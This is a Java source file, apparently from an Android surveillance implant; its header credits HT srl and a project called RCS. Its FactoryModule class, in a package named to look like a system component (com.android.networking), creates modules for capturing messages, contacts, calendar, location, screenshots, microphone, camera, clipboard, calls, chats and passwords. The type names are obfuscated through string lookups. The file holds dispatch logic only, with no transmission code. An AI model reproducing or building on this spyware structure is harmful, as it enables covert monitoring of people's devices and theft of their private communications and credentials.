/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module;

import com.android.networking.Messages;
import com.android.networking.auto.Cfg;
import com.android.networking.interfaces.AbstractFactory;
import com.android.networking.util.Check;

public class FactoryModule implements AbstractFactory<BaseModule, String> {
	private static final String TAG = "FactoryAgent"; //$NON-NLS-1$

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	public BaseModule create(String type, String subtype) {
		BaseModule a = new NullModule();

		if (Messages.getString("c_0").equals(type)) { //$NON-NLS-1$
			a = new ModuleMessage();
		} else if (Messages.getString("c_1").equals(type)) { //$NON-NLS-1$
			a = new ModuleAddressBook();
		} else if (Messages.getString("c_2").equals(type)) { //$NON-NLS-1$
			a = new ModuleCalendar();
		} else if (Messages.getString("c_4").equals(type)) { //$NON-NLS-1$
			a = new ModuleDevice();
		} else if (Messages.getString("c_5").equals(type)) { //$NON-NLS-1$
			a = new ModulePosition();
		} else if (Messages.getString("c_6").equals(type)) { //$NON-NLS-1$
			a = new ModuleSnapshot();
		} else if (Messages.getString("c_7").equals(type)) { //$NON-NLS-1$
			a = new ModuleMessage();
		} else if (Messages.getString("c_8").equals(type)) { //$NON-NLS-1$
			a = new ModuleMic();
		} else if (Messages.getString("c_9").equals(type)) { //$NON-NLS-1$
			a = new ModuleCamera();
		} else if (Messages.getString("c_10").equals(type)) { //$NON-NLS-1$
			a = new ModuleClipboard();
		} else if (Messages.getString("c_11").equals(type)) { //$NON-NLS-1$
			a = new ModuleCrisis();
		} else if (Messages.getString("c_12").equals(type)) { //$NON-NLS-1$
			a = new ModuleApplication();
		} else if (Messages.getString("c_13").equals(type)) { //$NON-NLS-1$
			a = new ModuleCall();
		}else if (Messages.getString("c_14").equals(type)) { //$NON-NLS-1$
			a = new ModuleChat();
		}else if (Messages.getString("c_15").equals(type)) { //$NON-NLS-1$
			if(Cfg.ENABLE_PASSWORD_MODULE){
				a = new ModulePassword();
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (factory), unknown type: " + type);//$NON-NLS-1$
			}
		}

		return a;
	}
}
